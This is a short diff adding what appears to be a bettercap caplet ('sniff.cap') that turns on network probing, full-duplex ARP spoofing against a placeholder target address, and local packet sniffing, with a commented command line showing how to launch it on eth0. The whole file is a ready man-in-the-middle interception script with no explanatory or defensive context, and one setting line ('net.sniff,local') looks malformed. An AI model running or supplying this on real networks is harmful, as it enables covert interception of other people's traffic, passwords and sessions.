@@ -1,0 +1,8 @@
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets <ip>
+set net.sniff,local true
+arp.spoof on
+net.sniff on
+#bettercap -iface eth0 -caplet sniff.cap
+
